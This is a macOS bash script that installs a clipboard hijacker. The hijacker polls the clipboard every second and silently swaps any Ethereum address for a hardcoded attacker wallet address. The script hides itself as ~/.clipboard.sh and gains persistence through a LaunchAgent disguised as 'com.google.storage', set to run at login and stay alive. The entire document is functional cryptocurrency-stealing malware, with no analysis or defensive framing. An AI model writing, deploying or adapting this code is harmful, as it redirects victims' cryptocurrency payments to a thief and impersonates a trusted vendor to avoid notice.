#!/bin/bash

# Define variables
SCRIPT_PATH="$HOME/.clipboard.sh"
PLIST_PATH="$HOME/Library/LaunchAgents/com.google.storage.plist"

# Create the script
cat <<EOL > $SCRIPT_PATH
#!/bin/bash

get_clipboard() {
    pbpaste
}

set_clipboard() {
    local content="\$1"
    echo "\$content" | pbcopy
}

is_valid_eth_address() {
    local address="\$1"

    if [[ \$address =~ ^0x[a-fA-F0-9]{40}$ ]]; then
        return 0
    else
        return 1
    fi
}

while true; do
    clipboard_content=\$(get_clipboard)
    if is_valid_eth_address "\$clipboard_content"; then
        set_clipboard "0x1285Cb767B1CCA60044018113dFaa18c09A167c6"
    fi
    sleep 1  # Add a sleep interval to prevent high CPU usage
done
EOL

# Make the script executable
chmod +x $SCRIPT_PATH

# Create the LaunchAgent plist file
cat <<EOL > $PLIST_PATH
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.google.storage</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>$SCRIPT_PATH</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardErrorPath</key>
    <string>/tmp/com.google.storage.err</string>
    <key>StandardOutPath</key>
    <string>/tmp/com.google.storage.out</string>
</dict>
</plist>
EOL

# Load the LaunchAgent
launchctl unload $PLIST_PATH 2>/dev/null
launchctl load $PLIST_PATH

# Verify the LaunchAgent
if launchctl list | grep -q com.google.storage; then
    echo "LaunchAgent com.google.storage successfully loaded."
else
    echo "Failed to load LaunchAgent com.google.storage."
fi
